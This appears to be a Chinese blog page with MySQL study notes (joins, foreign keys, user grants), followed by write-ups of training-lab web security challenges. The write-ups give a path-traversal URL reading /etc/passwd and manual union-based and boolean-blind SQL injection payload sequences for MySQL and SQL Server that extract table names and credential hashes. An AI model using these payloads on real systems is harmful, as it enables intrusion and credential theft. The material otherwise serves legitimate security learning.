<h3 id="1-7左右连表"><a href="#1-7左右连表" class="headerlink" title="1.7左右连表"></a>1.7左右连表</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select * from info left outer join depart on info.depart_id = depart.id;</span><br><span class="line">主表 left outer join 从表 on 主表.x=从表.id	#主表为主，从表为辅</span><br></pre></td></tr></table></figure>

<h3 id="1-8上下连表"><a href="#1-8上下连表" class="headerlink" title="1.8上下连表"></a>1.8上下连表</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select id, title from depart</span><br><span class="line">union			#自动去重（id）		union all保留原属数据</span><br><span class="line">select id, name from info</span><br></pre></td></tr></table></figure>

<h2 id="2-SQL执行顺序"><a href="#2-SQL执行顺序" class="headerlink" title="2.SQL执行顺序"></a>2.SQL执行顺序</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">join</span><br><span class="line">on</span><br><span class="line">where</span><br><span class="line">group by</span><br><span class="line">having</span><br><span class="line">order by</span><br><span class="line">limit</span><br></pre></td></tr></table></figure>

<h2 id="3-表关系"><a href="#3-表关系" class="headerlink" title="3.表关系"></a>3.表关系</h2><h3 id="一对多"><a href="#一对多" class="headerlink" title="一对多"></a>一对多</h3><p>开发中需要添加外键，保证某一列的值必须是其他列中特定列已存在得到值</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">#创建			fk_info_depart是外键名字</span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> info(</span><br><span class="line">	id <span class="type">int</span> <span class="keyword">not</span> <span class="keyword">null</span> <span class="keyword">primary</span> key auto_increment,</span><br><span class="line">    title <span class="type">varchar</span>(<span class="number">16</span>) <span class="keyword">not</span> <span class="keyword">null</span>,</span><br><span class="line">    email <span class="type">varchar</span>(<span class="number">32</span>) <span class="keyword">not</span> <span class="keyword">null</span>,</span><br><span class="line">    age <span class="type">int</span>,</span><br><span class="line">    depart_id <span class="type">int</span> <span class="keyword">not</span> <span class="keyword">null</span>,</span><br><span class="line">    <span class="keyword">constraint</span> fk_info_depart <span class="keyword">foreign</span> key (depart_id) <span class="keyword">references</span> depart(id)</span><br><span class="line">)<span class="keyword">default</span> charset<span class="operator">=</span>utf8</span><br><span class="line">#修改</span><br><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> info <span class="keyword">add</span> <span class="keyword">constraint</span> fk_info_depart <span class="keyword">foreign</span> key info(depart_id) <span class="keyword">references</span> depart(id)</span><br><span class="line">#删除</span><br><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> info <span class="keyword">drop</span> <span class="keyword">foreign</span> key fk_info_depart</span><br></pre></td></tr></table></figure>

<h3 id="多对多"><a href="#多对多" class="headerlink" title="多对多"></a>多对多</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> boy(</span><br><span class="line">	id <span class="type">int</span> <span class="keyword">not</span> <span class="keyword">null</span> <span class="keyword">primary</span> key auto_increment,</span><br><span class="line">    name <span class="type">varchar</span>(<span class="number">16</span>) <span class="keyword">not</span> <span class="keyword">null</span></span><br><span class="line">)<span class="keyword">default</span> charset<span class="operator">=</span>utf8;</span><br><span class="line"></span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> girl(</span><br><span class="line">	id <span class="type">int</span> <span class="keyword">not</span> <span class="keyword">null</span> <span class="keyword">primary</span> key auto_increment,</span><br><span class="line">    name <span class="type">varchar</span>(<span class="number">16</span>) <span class="keyword">not</span> <span class="keyword">null</span></span><br><span class="line">)<span class="keyword">default</span> charset<span class="operator">=</span>utf8;</span><br><span class="line"></span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> boy_girl(</span><br><span class="line">	id <span class="type">int</span> <span class="keyword">not</span> <span class="keyword">null</span> <span class="keyword">primary</span> key auto_increment,</span><br><span class="line">    boy_id <span class="type">int</span> <span class="keyword">not</span> <span class="keyword">null</span>,</span><br><span class="line">    girl_id <span class="type">int</span> <span class="keyword">not</span> <span class="keyword">null</span>,</span><br><span class="line">    <span class="keyword">constraint</span> fk_boy <span class="keyword">foreign</span> key boy_girl(boy_id) referencecs boy(id)</span><br><span class="line">    <span class="keyword">constraint</span> fk_girl <span class="keyword">foreign</span> key boy_girl(girl_id) <span class="keyword">references</span> girl(id)</span><br><span class="line">)<span class="keyword">default</span> charset<span class="operator">=</span>utf8</span><br></pre></td></tr></table></figure>

<h2 id="用户授权"><a href="#用户授权" class="headerlink" title="用户授权"></a>用户授权</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">show</span> databases;</span><br><span class="line"><span class="keyword">select</span> <span class="keyword">user</span>, authentication_string, host <span class="keyword">from</span> mysql.user</span><br><span class="line"><span class="keyword">desc</span> mysql.user</span><br><span class="line">use mysql;</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> <span class="keyword">user</span><span class="operator">=</span><span class="string">&#x27;root&#x27;</span></span><br></pre></td></tr></table></figure>

<p><img src="/2023/07/05/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/1652514336912.png" alt="1652514336912"></p>
<p><img src="/2023/07/05/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/1652514299347.png" alt="1652514299347"></p>
<p><img src="/2023/07/05/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/1652514169661.png"></p>
<h3 id="创建删除用户"><a href="#创建删除用户" class="headerlink" title="创建删除用户"></a>创建删除用户</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">create user &#x27;用户名&#x27;@&#x27;连接者的ip地址&#x27; identified by &#x27;密码&#x27;</span><br><span class="line">e.g.</span><br><span class="line">create user hyy1996@127.0.0.1 identified by &#x27;hyy1996&#x27;</span><br><span class="line">create user hyy1990@&#x27;127.0.0.%&#x27; identified by &#x27;hyy1990&#x27;</span><br><span class="line">create user hyy1000@&#x27;%&#x27; identified by &#x27;hyy1000&#x27;		#随便哪个</span><br></pre></td></tr></table></figure>

<h3 id="修改用户"><a href="#修改用户" class="headerlink" title="修改用户"></a>修改用户</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rename <span class="keyword">user</span> <span class="string">&#x27;用户名&#x27;</span>@<span class="string">&#x27;IP地址&#x27;</span> <span class="keyword">to</span> <span class="string">&#x27;新用户名&#x27;</span>@<span class="string">&#x27;IP地址&#x27;</span></span><br></pre></td></tr></table></figure>

<h3 id="修改密码"><a href="#修改密码" class="headerlink" title="修改密码"></a>修改密码</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set password for &#x27;用户名&#x27;@&#x27;IP地址&#x27; = Password(&#x27;新密码&#x27;)</span><br></pre></td></tr></table></figure>

<h3 id="授权管理"><a href="#授权管理" class="headerlink" title="授权管理"></a>授权管理</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">grant</span> 权限 <span class="keyword">on</span> 数据库.表 <span class="keyword">to</span> <span class="string">&#x27;用户&#x27;</span>@<span class="string">&#x27;IP地址&#x27;</span></span><br><span class="line"><span class="keyword">grant</span> <span class="keyword">all</span> privileges <span class="keyword">on</span> <span class="string">&#x27;.&#x27;</span> <span class="keyword">to</span> <span class="string">&#x27;hyy19&#x27;</span>@<span class="string">&#x27;localhost&#x27;</span>#用户hyy19所有数据库权限</span><br><span class="line"><span class="keyword">grant</span> <span class="keyword">all</span> privileges <span class="keyword">on</span> day26.<span class="operator">*</span> <span class="keyword">to</span> <span class="string">&#x27;hyy19&#x27;</span>@<span class="string">&#x27;localhost&#x27;</span>#数据库day26的权限</span><br><span class="line"><span class="keyword">grant</span> <span class="keyword">select</span>, inser <span class="keyword">on</span> day26db.<span class="operator">*</span> <span class="keyword">to</span> <span class="string">&#x27;hyy19&#x27;</span>@<span class="string">&#x27;localhost&#x27;</span></span><br></pre></td></tr></table></figure>




      
    </div>
    <footer class="article-footer">
      <a data-url="http://huyaoyao2019.github.io/2023/07/05/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/" data-id="cljpvpsxp0000ygezggrehut1" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-墨者学院" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2023/07/05/%E5%A2%A8%E8%80%85%E5%AD%A6%E9%99%A2/" class="article-date">
  <time class="dt-published" datetime="2023-07-05T15:30:58.646Z" itemprop="datePublished">2023-07-05</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="WEB安全"><a href="#WEB安全" class="headerlink" title="WEB安全"></a>WEB安全</h1><h2 id="任意文件读取"><a href="#任意文件读取" class="headerlink" title="任意文件读取"></a>任意文件读取</h2><h3 id="uWSGI-漏洞复现（CVE-2018-7490）"><a href="#uWSGI-漏洞复现（CVE-2018-7490）" class="headerlink" title="uWSGI 漏洞复现（CVE-2018-7490）"></a>uWSGI 漏洞复现（CVE-2018-7490）</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//参考</span></span><br><span class="line"><span class="comment">//https://blog.csdn.net/weixin_45736958/article/details/117717777</span></span><br><span class="line">php目录遍历漏洞</span><br><span class="line">uWSGI是一个Web服务器，它实现了WSGI协议、uwsgi、http等协议。Nginx中HttpUwsgiModule的作用是与uWSGI服务器进行交换。WSGI是一种Web服务器网关接口。它是一个Web服务器（如nginx，uWSGI等服务器）与web应用（如用Flask框架写的程序）通信的一种规范</span><br><span class="line">https:<span class="comment">//blog.csdn.net/weixin_45736958/article/details/117717777</span></span><br><span class="line">../../../key.txt</span><br></pre></td></tr></table></figure>

<h3 id="Ruby-On-Ruby-On-Rails漏洞复现第一题（CVE-2018-3760"><a href="#Ruby-On-Ruby-On-Rails漏洞复现第一题（CVE-2018-3760" class="headerlink" title="Ruby On  Ruby On Rails漏洞复现第一题（CVE-2018-3760)"></a>Ruby On  Ruby On Rails漏洞复现第一题（CVE-2018-3760)</h3><p><img src="/2023/07/05/%E5%A2%A8%E8%80%85%E5%AD%A6%E9%99%A2/1656752121065.png" alt="1656752121065"></p>
<p><img src="/2023/07/05/%E5%A2%A8%E8%80%85%E5%AD%A6%E9%99%A2/1656752187237.png" alt="1656752187237"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">替换之后我理解file伪协议显示的是文件而不是文件夹</span><br><span class="line">最后</span><br><span class="line">http://124.70.64.48:40318/assets/file:%2f%2f/usr/src/blog/app/assets/config/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/etc/passwd</span><br><span class="line"></span><br><span class="line">两个问题：</span><br><span class="line">	1.路径的assets</span><br><span class="line">	2.php的file伪协议要验证</span><br></pre></td></tr></table></figure>



<h2 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h2><h3 id="SQL手工注入漏洞测试-MySQL数据库"><a href="#SQL手工注入漏洞测试-MySQL数据库" class="headerlink" title="SQL手工注入漏洞测试(MySQL数据库)"></a>SQL手工注入漏洞测试(MySQL数据库)</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//判断注入点</span></span><br><span class="line">new_list.php?id=<span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span>=<span class="number">1</span></span><br><span class="line">new_list.php?id=<span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span>=<span class="number">2</span></span><br><span class="line"><span class="comment">//判断回显多少个字段  5不行</span></span><br><span class="line">new_list.php?id=<span class="number">1</span> order by <span class="number">4</span></span><br><span class="line"><span class="comment">//union查询		2是标题 	3是内容</span></span><br><span class="line">new_list.php?id=<span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span>=<span class="number">2</span> union select <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span></span><br><span class="line"><span class="comment">//测试，查看版本		database()=mozhe_Discuz_StormGroup</span></span><br><span class="line">new_list.php?id=<span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span>=<span class="number">2</span> union select <span class="number">1</span>, <span class="title function_ invoke__">version</span>(), <span class="title function_ invoke__">database</span>(), <span class="number">4</span></span><br><span class="line"><span class="comment">//查看有哪些table			StormGroup_member,notice</span></span><br><span class="line">new_list.php?id=<span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span>=<span class="number">2</span> union select <span class="number">1</span>, <span class="number">2</span>, <span class="title function_ invoke__">group_concat</span>(table_name), <span class="number">4</span> <span class="keyword">from</span> information_schema.tables where table_schema = <span class="string">&#x27;mozhe_Discuz_StormGroup&#x27;</span></span><br><span class="line"><span class="comment">//查看有哪些字段			id,name,password,status</span></span><br><span class="line">new_list.php?id=<span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span>=<span class="number">2</span> union select <span class="number">1</span>, <span class="number">2</span>, <span class="title function_ invoke__">group_concat</span>(column_name),<span class="number">4</span> <span class="keyword">from</span> information_schema.columns where table_name = <span class="string">&#x27;StormGroup_member&#x27;</span></span><br><span class="line"><span class="comment">//查看name				mozhe,mozhe</span></span><br><span class="line">new_list.php?id=<span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span>=<span class="number">2</span> union select <span class="number">1</span>, <span class="number">2</span>, <span class="title function_ invoke__">group_concat</span>(name),<span class="number">4</span> <span class="keyword">from</span> mozhe_Discuz_StormGroup.StormGroup_member</span><br><span class="line"><span class="comment">//查看password		356f589a7df439f6f744ff19bb8092c0,01aef4e3ad142a021314a5100041482a</span></span><br><span class="line">new_list.php?id=<span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span>=<span class="number">2</span> union select <span class="number">1</span>, <span class="number">2</span>, <span class="title function_ invoke__">group_concat</span>(password),<span class="number">4</span> <span class="keyword">from</span> mozhe_Discuz_StormGroup.StormGroup_membe</span><br><span class="line"><span class="comment">//md5解码</span></span><br><span class="line">dsan13		<span class="number">789304</span></span><br></pre></td></tr></table></figure>

<h3 id="SQL手工注入漏洞测试-Sql-Server数据库"><a href="#SQL手工注入漏洞测试-Sql-Server数据库" class="headerlink" title="SQL手工注入漏洞测试(Sql Server数据库)"></a>SQL手工注入漏洞测试(Sql Server数据库)</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//判断注入</span></span><br><span class="line">new_list.asp?id=<span class="number">1</span>				<span class="comment">#异常</span></span><br><span class="line">new_list.asp?id=<span class="number">2</span>				<span class="comment">#正常</span></span><br><span class="line">new_list.asp?id=<span class="number">2</span> <span class="keyword">and</span> <span class="number">1</span>=<span class="number">1</span>		<span class="comment">#正常</span></span><br><span class="line">new_list.asp?id=<span class="number">2</span> <span class="keyword">and</span> <span class="number">1</span>=<span class="number">2</span>		<span class="comment">#异常</span></span><br><span class="line"><span class="comment">//回显</span></span><br><span class="line">new_list.asp?id=<span class="number">2</span> order by <span class="number">1</span></span><br><span class="line">new_list.asp?id=<span class="number">2</span> order by <span class="number">2</span></span><br><span class="line">new_list.asp?id=<span class="number">2</span> order by <span class="number">3</span>		<span class="comment">#异常</span></span><br><span class="line">new_list.asp?id=<span class="number">2</span> order by <span class="number">4</span></span><br><span class="line">new_list.asp?id=<span class="number">2</span> order by <span class="number">5</span>		<span class="comment">#异常</span></span><br><span class="line"><span class="comment">//union查询	union和union all的区别(https://jingyan.baidu.com/article/2d5afd69e8dfd285a3e28e66.html)</span></span><br><span class="line">new_list.asp?id=<span class="number">2</span> <span class="keyword">and</span> <span class="number">1</span>=<span class="number">2</span> union select <span class="literal">null</span>,<span class="literal">null</span>,<span class="literal">null</span>,<span class="literal">null</span>			<span class="comment">#兼容异常</span></span><br><span class="line">new_list.asp?id=<span class="number">2</span> <span class="keyword">and</span> <span class="number">1</span>=<span class="number">2</span> union all select <span class="literal">null</span>,<span class="literal">null</span>,<span class="literal">null</span>,<span class="literal">null</span></span><br><span class="line">new_list.asp?id=<span class="number">2</span> <span class="keyword">and</span> <span class="number">1</span>=<span class="number">2</span> union all select <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>					<span class="comment">#异常	sqlserver注入用null不用数字</span></span><br><span class="line">new_list.asp?id=<span class="number">2</span> <span class="keyword">and</span> <span class="number">1</span>=<span class="number">2</span> union all select <span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;2&#x27;</span>,<span class="string">&#x27;3&#x27;</span>,<span class="string">&#x27;4&#x27;</span>			<span class="comment">#这个不报错</span></span><br><span class="line"><span class="comment">//查数据库名				mozhe_db_v2</span></span><br><span class="line">new_list.asp?id=<span class="number">2</span> <span class="keyword">and</span> <span class="number">1</span>=<span class="number">2</span> union all select <span class="string">&#x27;1&#x27;</span>,<span class="title function_ invoke__">db_name</span>(),<span class="string">&#x27;3&#x27;</span>,<span class="string">&#x27;4&#x27;</span></span><br><span class="line"><span class="comment">//sqlserver和mysql语法不一样</span></span><br><span class="line"><span class="comment">//查数据表名</span></span><br><span class="line"><span class="comment">//manage</span></span><br><span class="line">new_list.asp?id=<span class="number">1</span> union all select <span class="number">1</span>,(select top <span class="number">1</span> name <span class="keyword">from</span> mozhe_db_v2.dbo.sysobjects where xtype=<span class="string">&#x27;u&#x27;</span>),<span class="string">&#x27;3&#x27;</span>,<span class="literal">null</span></span><br><span class="line"><span class="comment">//announcement</span></span><br><span class="line">new_list.asp?id=<span class="number">1</span> union all select <span class="number">1</span>,(select top <span class="number">1</span> name <span class="keyword">from</span> mozhe_db_v2.dbo.sysobjects where xtype=<span class="string">&#x27;u&#x27;</span> <span class="keyword">and</span> name not <span class="title function_ invoke__">in</span> (<span class="string">&#x27;manage&#x27;</span>)),<span class="string">&#x27;3&#x27;</span>,<span class="literal">null</span></span><br><span class="line"><span class="comment">//没了</span></span><br><span class="line">new_list.asp?id=<span class="number">1</span> union all select <span class="number">1</span>,(select top <span class="number">1</span> name <span class="keyword">from</span> mozhe_db_v2.dbo.sysobjects where xtype=<span class="string">&#x27;u&#x27;</span> <span class="keyword">and</span> name not <span class="title function_ invoke__">in</span> (<span class="string">&#x27;manage&#x27;</span>,<span class="string">&#x27;announcement&#x27;</span>)),<span class="string">&#x27;3&#x27;</span>,<span class="literal">null</span></span><br><span class="line"><span class="comment">//查列名</span></span><br><span class="line"><span class="comment">//id</span></span><br><span class="line">new_list.asp?id=<span class="number">1</span> union all select <span class="literal">null</span>,(select top <span class="number">1</span> <span class="title function_ invoke__">col_name</span>(<span class="title function_ invoke__">object_id</span>(<span class="string">&#x27;manage&#x27;</span>),<span class="number">1</span>) <span class="keyword">from</span> sysobjects),<span class="literal">null</span>,<span class="literal">null</span></span><br><span class="line"><span class="comment">//username</span></span><br><span class="line">new_list.asp?id=<span class="number">1</span> union all select <span class="literal">null</span>,(select top <span class="number">1</span> <span class="title function_ invoke__">col_name</span>(<span class="title function_ invoke__">object_id</span>(<span class="string">&#x27;manage&#x27;</span>),<span class="number">2</span>) <span class="keyword">from</span> sysobjects),<span class="literal">null</span>,<span class="literal">null</span></span><br><span class="line"><span class="comment">//password</span></span><br><span class="line">new_list.asp?id=<span class="number">1</span> union all select <span class="literal">null</span>,(select top <span class="number">1</span> <span class="title function_ invoke__">col_name</span>(<span class="title function_ invoke__">object_id</span>(<span class="string">&#x27;manage&#x27;</span>),<span class="number">3</span>) <span class="keyword">from</span> sysobjects),<span class="literal">null</span>,<span class="literal">null</span></span><br><span class="line"><span class="comment">//空</span></span><br><span class="line">new_list.asp?id=<span class="number">1</span> union all select <span class="literal">null</span>,(select top <span class="number">1</span> <span class="title function_ invoke__">col_name</span>(<span class="title function_ invoke__">object_id</span>(<span class="string">&#x27;manage&#x27;</span>),<span class="number">4</span>) <span class="keyword">from</span> sysobjects),<span class="literal">null</span>,<span class="literal">null</span>    </span><br><span class="line"><span class="comment">//查询用户名密码		admin_mz	72e1bfc3f01b7583	97285101</span></span><br><span class="line">new_list.asp?id=<span class="number">1</span> union all select <span class="literal">null</span>,username, password ,<span class="literal">null</span> <span class="keyword">from</span> manage</span><br></pre></td></tr></table></figure>

<h3 id="SQL注入漏洞测试-布尔盲注"><a href="#SQL注入漏洞测试-布尔盲注" class="headerlink" title="SQL注入漏洞测试(布尔盲注)"></a>SQL注入漏洞测试(布尔盲注)</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line">#当前数据库字符长度</span><br><span class="line">new_list.php?id=1%20and%20length(database())=10</span><br><span class="line">#stormgroup</span><br><span class="line">new_list.php?id=1%20and%20ascii(substr(database(),2,1))=115</span><br><span class="line">new_list.php?id=1%20and%20ascii(substr(database(),2,1))=116</span><br><span class="line">new_list.php?id=1%20and%20ascii(substr(database(),3,1))=111</span><br><span class="line">new_list.php?id=1%20and%20ascii(substr(database(),4,1))=114</span><br><span class="line">new_list.php?id=1%20and%20ascii(substr(database(),5,1))=109</span><br><span class="line">new_list.php?id=1%20and%20ascii(substr(database(),6,1))=103</span><br><span class="line">new_list.php?id=1%20and%20database()=&quot;stormgroup&quot;</span><br><span class="line">#查表的数量		2</span><br><span class="line">new_list.php?id=1 and (select count(table_name) from information_schema.tables where table_schema=database())=2</span><br><span class="line">#表1长度			6</span><br><span class="line">new_list.php?id=1 and length(</span><br><span class="line">substr((select table_name from information_schema.tables where table_schema = database() limit 0,1),1))=6</span><br><span class="line">#表2长度			6</span><br><span class="line">new_list.php?id=1 and length(</span><br><span class="line">substr((select table_name from information_schema.tables where table_schema = database() limit 1,1),1))=6</span><br><span class="line">#确定表1名		member		substr这里有一个强转字符</span><br><span class="line">new_list.php?id=1 and ascii(substr((select table_name from information_schema.tables where table_schema = &quot;stormgroup&quot; limit 0,1),1,1))=109</span><br><span class="line">new_list.php?id=1 and ascii(substr((select table_name from information_schema.tables where table_schema = &quot;stormgroup&quot; limit 0,1),2,1))=101</span><br><span class="line">new_list.php?id=1 and ascii(substr((select table_name from information_schema.tables where table_schema = &quot;stormgroup&quot; limit 0,1),3,1))=109</span><br><span class="line">new_list.php?id=1 and substr((select table_name from information_schema.tables where table_schema = &quot;stormgroup&quot; limit 0,1),1) = &#x27;member&#x27;</span><br><span class="line">#确定表2名		notice</span><br><span class="line">new_list.php?id=1 and ascii(substr((select table_name from information_schema.tables where table_schema = &quot;stormgroup&quot; limit 1,1),1,1))=110</span><br><span class="line">new_list.php?id=1 and ascii(substr((select table_name from information_schema.tables where table_schema = &quot;stormgroup&quot; limit 1,1),2,1))=111</span><br><span class="line">new_list.php?id=1 and ascii(substr((select table_name from information_schema.tables where table_schema = &quot;stormgroup&quot; limit 1,1),3,1))=116</span><br><span class="line">new_list.php?id=1 and ascii(substr((select table_name from information_schema.tables where table_schema = &quot;stormgroup&quot; limit 1,1),4,1))=105</span><br><span class="line">new_list.php?id=1 and ascii(substr((select table_name from information_schema.tables where table_schema = &quot;stormgroup&quot; limit 1,1),5,1))=99</span><br><span class="line">new_list.php?id=1 and ascii(substr((select table_name from information_schema.tables where table_schema = &quot;stormgroup&quot; limit 1,1),6,1))=101</span><br><span class="line">new_list.php?id=1 and substr((select table_name from information_schema.tables where table_schema = &quot;stormgroup&quot; limit 1,1),1) = &#x27;notice&#x27;</span><br><span class="line">#查看member表有多少字段			#3</span><br><span class="line">new_list.php?id=1 and (select count(column_name) from information_schema.columns where table_name=&#x27;member&#x27;)=3</span><br><span class="line">#分别查看3个字段的长度	4	8</span><br><span class="line">new_list.php?id=1 and length(substr((select column_name from information_schema.columns where table_name=&#x27;member&#x27; limit 0,1),1))=4</span><br><span class="line">new_list.php?id=1 and length(substr((select column_name from information_schema.columns where table_name=&#x27;member&#x27; limit 1,1),1))=8</span><br><span class="line">#第一个字段	name</span><br><span class="line">new_list.php?id=1 and ascii(substr((select column_name from information_schema.columns where table_name=&#x27;member&#x27; limit 0,1),1,1))=110</span><br><span class="line">new_list.php?id=1 and ascii(substr((select column_name from information_schema.columns where table_name=&#x27;member&#x27; limit 0,1),2,1))=97</span><br><span class="line">new_list.php?id=1 and ascii(substr((select column_name from information_schema.columns where table_name=&#x27;member&#x27; limit 0,1),3,1))=109</span><br><span class="line">new_list.php?id=1 and substr((select column_name from information_schema.columns where table_name=&#x27;member&#x27; limit 0,1),1)=&#x27;name&#x27;</span><br><span class="line">#第二个字段	password</span><br><span class="line">new_list.php?id=1 and substr((select column_name from information_schema.columns where table_name=&#x27;member&#x27; limit 1,1),1)=&#x27;password&#x27;</span><br><span class="line">#查name有几行		2</span><br><span class="line">new_list.php?id=1 and (select count(name) from stormgroup.member)=2</span><br><span class="line">#查第一个用户</span><br><span class="line">#name 5个字母	password</span><br><span class="line">new_list.php?id=1 and length(substr((select name from stormgroup.member limit 0,1),1))=5</span><br><span class="line">new_list.php?id=1 and length(substr((select password from stormgroup.member limit 0,1),1))=32</span><br><span class="line">#猜是mozhe</span><br><span class="line">new_list.php?id=1 and substr((select name from stormgroup.member limit 0,1),1)=&#x27;mozhe&#x27;</span><br><span 